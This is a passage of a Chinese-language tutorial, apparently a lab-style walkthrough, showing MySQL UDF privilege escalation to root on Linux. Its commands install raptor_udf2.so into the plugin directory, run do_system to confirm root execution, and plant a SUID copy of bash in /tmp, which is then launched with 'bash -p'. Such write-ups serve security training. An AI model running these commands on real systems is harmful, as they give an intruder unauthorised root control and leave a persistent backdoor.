<p><img decoding="async" loading="lazy" src="data:image/png;base64,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" width="635" height="48" class="img_ev3q"></p>
<p>要从数据库内部复制文件，我们可以使用以下命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">\! cp /tmp/raptor_udf2.so /usr/lib/mysql/plugin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在，如果我们将会话置于后台（CTRL + Z），我们将看到该文件已以正确的字节数添加到插件目录中。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536958-311312329-1e34b40bfb350400bfd49534484540b3.png" width="1024" height="145" class="img_ev3q"></p>
<p>现在问题都解决了，我们可以再次尝试创建函数。这次应该不会出错了，因为文件的字节数是正确的。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536170-819090341-7808e42d353702dc1cf291f72f810bdd.png" width="643" height="86" class="img_ev3q"></p>
<p>成功了！我们可以使用以下命令确认该函数已成功创建：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select * from mysql.func;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536039-115484386-183f3e3b855f509a30b6dd7e55014512.png" width="406" height="127" class="img_ev3q"></p>
<p>Perfect！这证实一切都已就位，并准备好让我们对共享对象文件进行恶意攻击！</p>
<p>对于 POC，我们可以使用以下命令创建一个 txt 文件，该文件将确认我们以 root 身份执行命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select do_system(&#x27;whoami &gt; /tmp/whoami.txt&#x27;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536463-177844577-0410bd50c9391710ba9ec09f0865ffc5.png" width="442" height="138" class="img_ev3q"></p>
<p>虽然它显示“0”，但执行成功，通过再次将会话置于后台，我们可以在 /tmp 中看到 TXT 文件，并且它属于 root！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536163-2008272780-3be78220b3e02b70d3852dea5f068945.png" width="429" height="83" class="img_ev3q"></p>
<p>Amazing！ POC 成功，我们正式以 root 身份执行命令！现在我们可以使用 1-liner 将反向 shell 发送回攻击者，或者我们可以做一些更简单的事情，只需将 bash 二进制文件复制到 /tmp 文件夹中并在其上设置 SUID 位。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">select do_system(&#x27;cp /bin/bash /tmp/bash ; chmod +s /tmp/bash&#x27;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这次，当我们再次检查 /tmp 目录时，我们看到 bash 的副本现在位于 /tmp 文件夹中，该文件夹由 root 拥有并设置了 SUID 位。</p>
<blockquote>
<p>SUID（执行时设置所有者用户 ID）是一种特殊的文件权限。通常情况下，当你运行一个程序时，它会以你当前的用户身份运行。但当一个程序设置了 SUID 位，程序就会以该文件所有者的身份运行！基本上，root 拥有的 SUID 二进制文件将以 root 的身份运行，无需使用 sudo。</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240618183536167-884500467-55212131c4907d73c89cecdba0948038.png" width="590" height="208" class="img_ev3q"></p>
<p>最后，要进入 root shell，我们可以简单地使用以下命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/tmp/bash -p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" 